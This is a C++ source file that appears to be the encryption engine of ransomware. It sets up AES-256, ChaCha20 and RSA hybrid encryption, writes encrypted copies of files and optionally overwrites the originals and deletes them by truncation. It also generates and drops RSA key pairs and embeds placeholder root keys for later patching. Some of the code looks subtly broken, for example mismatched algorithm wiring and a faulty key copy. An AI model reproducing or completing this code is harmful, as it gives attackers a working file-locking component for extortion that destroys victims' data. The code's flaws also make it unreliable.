#include "locker.h"
#include "filesystem.h"
#include "global_parameters.h"
#include "memory.h"
#include "logs.h"

#include <stdio.h>
#include <cstdint>
#include <string>



STATIC VOID PrintHex(const BYTE* data, DWORD size)
{
	for (size_t i = 0; i < size; ++i)
	{
		printf_s("\\x%02X", data[i]);
		//if ((i + 1) % 32 == 0) printf("\n");
	}
	printf_s("\n");
}

VOID aes_block_fn(PFILE_INFO FileInfo, crypto_aes_ctx* ctx, u32* padding, BYTE* in, BYTE* out, u32 bytes)
{	
	aes_encrypt_blocks(ctx, in, out, bytes, padding, FileInfo->CryptInfo->mode);
}


VOID chacha_block_fn(PFILE_INFO FileInfo, laced_ctx* ctx, u32* padding, BYTE* in, BYTE* out, u32 bytes)
{
	ECRYPT_encrypt_bytes(ctx, in, out, bytes);
}

STATIC VOID HandlerSymmetricGenKeyChaCha(laced_ctx* CryptCtx, CONST BYTE* ChaChaKey, CONST BYTE* ChaChaIV)
{	
	RtlSecureZeroMemory(CryptCtx, sizeof(CryptCtx));
	ECRYPT_keysetup(CryptCtx, ChaChaKey, 256, 64);
	ECRYPT_ivsetup(CryptCtx, ChaChaIV);
}

STATIC VOID HandlerSymmetricGenKeyAES(crypto_aes_ctx* CryptCtx, CONST BYTE* AESKey)
{	
	RtlSecureZeroMemory(CryptCtx, sizeof(CryptCtx));
	aes_expandkey(CryptCtx, AESKey);
}

VOID locker::CryptoSystemInit(CRYPTO_SYSTEM* sys)
{	
	sys->alg[0] =
	{
		.name = "AES256",
		.ctx = &sys->aes_ctx,
		.padding = 0,
		.mode = 0,
		.method_policy = AES256,
		.gen_policy = GENKEY_ONCE,
		.crypt_method = (EncryptMethodFunc)aes_block_fn,
		.gen_key_method = (EncryptGenKeyFunc)HandlerSymmetricGenKeyAES
	};

	sys->alg[1] =
	{
		.name = "ChaCha20",
		.ctx = &sys->chacha_ctx,
		.padding = 0,
		.mode = 0,
		.method_policy = CHACHA,
		.gen_policy = GENKEY_EVERY_ONCE,		
		.crypt_method = (EncryptMethodFunc)chacha_block_fn,
		.gen_key_method = (EncryptGenKeyFunc)HandlerSymmetricGenKeyChaCha
	};

	sys->alg[2] =
	{
		.name = "RSA_AES256",
		.ctx = &sys->aes_ctx,
		.padding = 0,
		.mode = 0,
		.method_policy = RSA_AES256,
		.gen_policy = GENKEY_EVERY_ONCE,
		.crypt_method = (EncryptMethodFunc)aes_block_fn,
		.gen_key_method = (EncryptGenKeyFunc)HandlerSymmetricGenKeyAES
	};

	sys->alg[3] =
	{
		.name = "RSA_CHACHA",
		.ctx = &sys->chacha_ctx,
		.padding = 0,
		.mode = 0,
		.method_policy = RSA_CHACHA,
		.gen_policy = GENKEY_EVERY_ONCE,
		.crypt_method = (EncryptMethodFunc)aes_block_fn,
		.gen_key_method = (EncryptGenKeyFunc)HandlerSymmetricGenKeyAES
	};

	sys->alg[4] =
	{
		.name = "RSA",
		.ctx = NULL,
		.padding = 0,
		.mode = 0,
		.method_policy = RSA,
		.gen_policy = NONE,
		.crypt_method = NULL,
		.gen_key_method = NULL
	};
	
	sys->num = 5;
}

CRYPT_INFO* CryptSystemGetMethod(CRYPTO_SYSTEM* sys, CryptoPolicy name)
{
	for (u32 i = 0; i < sys->num; ++i)
	{		
		if (sys->alg[i].method_policy == name)
			return &sys->alg[i];
	}
	return NULL;
}


CRYPT_INFO* locker::GeneratePolicy(CRYPTO_SYSTEM* sys)
{	
	CryptoSystemInit(sys);
	
	CRYPT_INFO* CryptInfo = CryptSystemGetMethod(sys, global::GetEncryptMethod());
	if (!CryptInfo)
		return NULL;
		
	if (CryptInfo->method_policy == AES256 || CryptInfo->method_policy == RSA_AES256)
	{
		EncryptCipher state_crypt = global::GetDeCrypt();
		EncryptModes state_mode = global::GetEncMode();

		if (state_crypt == EncryptCipher::CRYPT)
		{
			if (state_mode == EncryptModes::FULL_ENCRYPT)
				CryptInfo->mode = MODE_AES::AES_CRYPT;
			else
				CryptInfo->mode = MODE_AES::AES_CRYPT_NO_PADDING;
		}
		else if (state_crypt == EncryptCipher::DECRYPT)
		{
			if (state_mode == EncryptModes::FULL_ENCRYPT)
				CryptInfo->mode = MODE_AES::AES_DECRYPT;
			else
				CryptInfo->mode = MODE_AES::AES_DECRYPT_NO_PADDING;
		}
	}
	if (CryptInfo->gen_policy == GENKEY_ONCE)
		CryptInfo->gen_key_method(CryptInfo->ctx, global::GetKey(), global::GetIV());
	return CryptInfo;
}


STATIC BOOL SecureDelete(CONST WCHAR* FilePath)
{	
	HANDLE Handle = CreateFileW(FilePath, GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
	if (Handle == INVALID_HANDLE_VALUE)
		return FALSE;	

	if(SetFilePointer(Handle, 0, NULL, FILE_BEGIN) == INVALID_SET_FILE_POINTER
		|| !SetEndOfFile(Handle))
		return FALSE;
	CloseHandle(Handle);
	return DeleteFileW(FilePath);
}


STATIC BOOL SetOptionFileInfo(PFILE_INFO FileInfo, PDRIVE_INFO data, CRYPT_INFO* CryptInfo)
{
	FileInfo->Filename = data->Filename;
	FileInfo->newFilename = filesystem::MakeCopyFile(data->Path, data->Filename, data->Exst, data->FullPath);
	FileInfo->CryptInfo = CryptInfo;
	FileInfo->FilePath = data->FullPath;

	if (!filesystem::getParseFile(FileInfo) && FileInfo->FileHandle != INVALID_HANDLE_VALUE)
	{
		LOG_ERROR(L"Failed ParseFile %ls. GetLastError = %lu", data->Filename, GetLastError());
		return FALSE;
	}
	if (!filesystem::CreateFileOpen(FileInfo) && FileInfo->newFileHandle == INVALID_HANDLE_VALUE)
	{
		LOG_ERROR(L"Failed CreateFileOpen %ls GetLastError = %lu", data->Filename, GetLastError());
		return FALSE;
	}

	return TRUE;
}

BOOL locker::HandlerCrypt
(
	CRYPT_INFO* CryptInfo,
	PDRIVE_INFO data,
	SLIST<HLIST>* HashList
)
{		
	BOOL success = FALSE;
	EncryptCipher stateCipher = global::GetEncrypt();	
	FILE_INFO FileInfo;	
	EncryptModes mode = global::GetEncMode();
	if (!SetOptionFileInfo(&FileInfo, data, CryptInfo))
		goto END;

	if (HashList != NULL && global::GetDeCrypt() == EncryptCipher::CRYPT)
	{
		if (!filesystem::HashSignatureFile(HashList, &FileInfo))
			LOG_ERROR(L"Failed HashSignatureFile, filename -  %ls", data->Filename);
	}

	
	if (stateCipher == EncryptCipher::SYMMETRIC)
	{
		if(CryptInfo->gen_policy == GENKEY_EVERY_ONCE)
			CryptInfo->gen_key_method(CryptInfo->ctx, global::GetKey(), global::GetIV());
							
		if (!filesystem::OptionEncryptMode(&FileInfo, mode))
			goto END;
	}
	else if (stateCipher == EncryptCipher::ASYMMETRIC)
	{
		if (global::GetDeCrypt() == EncryptCipher::CRYPT)
		{	
			if (!filesystem::FileCryptEncrypt(&FileInfo, global::GetPathRSAKey()))
			{
				LOG_ERROR(L"Failed CryptEncrypt. filename - %ls", data->Filename);				
				goto END;
			}
		}
		else if (global::GetDeCrypt() == EncryptCipher::DECRYPT)
		{			
			if (!filesystem::FileCryptDecrypt(&FileInfo, global::GetPathRSAKey()))
			{
				LOG_ERROR(L"Failed CryptDecrypt. filename - %ls", data->Filename);				
				goto END;
			}
		}		
	}
	else if (stateCipher == EncryptCipher::RSA_ONLY)
	{
		if (!filesystem::EncryptRSA(&FileInfo, global::GetPathRSAKey()))
		{
			LOG_ERROR(L"Failed Encrypt/Decrypt ONLY RSA. filename - %ls", data->Filename);			
			goto END;
		}
	}

	if (HashList != NULL && global::GetDeCrypt() == EncryptCipher::DECRYPT)
	{
		if (!filesystem::HashSignatureFile(HashList, &FileInfo))
			LOG_ERROR(L"Failed HashSignatureFile. filename - %ls", data->Filename);
	}

	if (global::GetStatusOverWrite())
	{
		if (!filesystem::OverWriteFile(&FileInfo))
			LOG_ERROR(L"Failed OverWriteFile. filename - %ls", data->Filename);
	}

	LOG_SUCCESS(L"success encrypt file %ls", data->Filename);
	
	success = TRUE;
END:
	
	if (FileInfo.FileHandle && FileInfo.FileHandle != INVALID_HANDLE_VALUE)
		CloseHandle(FileInfo.FileHandle);
	if (FileInfo.newFileHandle && FileInfo.newFileHandle != INVALID_HANDLE_VALUE)
		CloseHandle(FileInfo.newFileHandle);

	if (!success)
		SecureDelete(FileInfo.newFilename);
	else if (global::GetFlagDelete())
		if (!SecureDelete(FileInfo.FilePath))
			LOG_ERROR(L"Failed Delete File - %ls; GetLastError = %lu", data->Filename, GetLastError());
	memory::m_free(FileInfo.newFilename);
	memory::memzero_explicit(&FileInfo, sizeof(FileInfo));
	return TRUE;
}



BOOL locker::HandlerGenKeyPairRSA()
{
	HCRYPTPROV CryptoProvider;
	HCRYPTKEY RsaKey;

	if (!CryptAcquireContextA(&CryptoProvider, NULL, NULL, PROV_RSA_FULL, CRYPT_VERIFYCONTEXT))
	{
		LOG_ERROR(L"Failed create provider. GetLastError = %lu.\n", GetLastError());
		return FALSE;
	}

	if (!CryptGenKey(CryptoProvider, AT_KEYEXCHANGE, global::GetBitKey() | CRYPT_EXPORTABLE, &RsaKey))
	{
		LOG_ERROR(L"Failed gen key. GetLastError = %lu.\n", GetLastError());
		CryptReleaseContext(CryptoProvider, 0);
		return FALSE;
	}


	DWORD SizeKey = 0;
	BYTE PublicKey[4096];
	if (!CryptExportKey(RsaKey, 0, PUBLICKEYBLOB, 0, NULL, &SizeKey))
	{
		LOG_ERROR(L"Failed to get public key length. GetLastError = %lu\n", GetLastError());
		CryptDestroyKey(RsaKey);
		CryptReleaseContext(CryptoProvider, 0);
		return FALSE;
	}

	if (!CryptExportKey(RsaKey, 0, PUBLICKEYBLOB, 0, PublicKey, &SizeKey))
	{
		LOG_ERROR(L"Failed export Key. GetLastError = %lu.\n", GetLastError());
		CryptDestroyKey(RsaKey);
		CryptReleaseContext(CryptoProvider, 0);
		return FALSE;
	}


	BYTE PrivateKey[4096];
	DWORD p_SizeKey = 0;
	if (!CryptExportKey(RsaKey, 0, PRIVATEKEYBLOB, 0, NULL, &p_SizeKey))
	{
		printf("Failed to get private key length. GetLastError = %lu\n", GetLastError());
		CryptDestroyKey(RsaKey);
		CryptReleaseContext(CryptoProvider, 0);
		return FALSE;
	}

	if (!CryptExportKey(RsaKey, 0, PRIVATEKEYBLOB, 0, PrivateKey, &p_SizeKey))
	{
		LOG_ERROR(L"Failed to export private key. GetLastError = %lu\n", GetLastError());
		CryptDestroyKey(RsaKey);
		CryptReleaseContext(CryptoProvider, 0);
		return FALSE;
	}


	if (!filesystem::DropRSAKey(global::GetPath(), PublicKey, PrivateKey, SizeKey, p_SizeKey))
	{
		LOG_ERROR(L"Failed to drop RSA key to path %ls. GetLastError = %lu\n", global::GetPath(), GetLastError());
		CryptDestroyKey(RsaKey);
		CryptReleaseContext(CryptoProvider, 0);
		return FALSE;
	}

	LOG_SUCCESS(L"Public Key (%lu bytes) generated and saved in: %ls\n", SizeKey, global::GetPath());
	LOG_SUCCESS(L"Private Key (%lu bytes) generated and saved in: %ls\n", p_SizeKey, global::GetPath());

	if (global::GetPrintHex())
	{
		printf_s("Public Key\n");
		PrintHex(PublicKey, SizeKey);
		printf_s("Private Key\n");
		PrintHex(PrivateKey, p_SizeKey);
	}


	RtlSecureZeroMemory(PrivateKey, p_SizeKey);
	RtlSecureZeroMemory(PublicKey, SizeKey);

	CryptDestroyKey(RsaKey);
	CryptReleaseContext(CryptoProvider, 0);
	return TRUE;
}

// hash public key -> signature this hash with root private kay. verify signature with root public key
VOID locker::LoadPublicRootKey(BYTE** g_PublicKeyRoot, DWORD* size)
{
	BYTE pub[] = "__public_key__"; // "\x06\x02\x00" Root RSA Public key / Type -print while gen keys
	*size = sizeof(pub);
	*g_PublicKeyRoot = (BYTE*)memory::m_malloc(4096);
	if (!g_PublicKeyRoot) return;
	memcpy(*g_PublicKeyRoot, pub, *size);
	memory::memzero_explicit((VOID*)pub, *size);
}

VOID locker::LoadPrivateRootKey(BYTE** g_PrivateKeyRoot, DWORD* size)
{
	BYTE prv[] = "__private_key__"; // "\x07\x02\x00" Root RSA Private key / Type -print while gen keys
	*size = sizeof(prv);
	*g_PrivateKeyRoot = (BYTE*)memory::m_malloc(4096);
	if (!g_PrivateKeyRoot) return;
	memcpy(*g_PrivateKeyRoot, prv, *size);
	memory::memzero_explicit((VOID*)prv, *size);
}

VOID locker::LoadRootSymmetricKey(BYTE** g_RootKey, BYTE** g_RootIV)
{
	BYTE root_key[] = "____________ROOT_KEY____________";
	BYTE root_iv[] = "ROOT__IV";
	*g_RootKey = (BYTE*)memory::m_malloc(32);
	*g_RootIV = (BYTE*)memory::m_malloc(8);
	if (!g_RootKey || !g_RootIV)
		return;
	memcpy(g_RootKey, root_key, 32);
	memcpy(g_RootIV, root_iv, 8);
	memory::memzero_explicit((VOID*)root_key, sizeof(root_key));
	memory::memzero_explicit((VOID*)root_iv, sizeof(root_iv));
}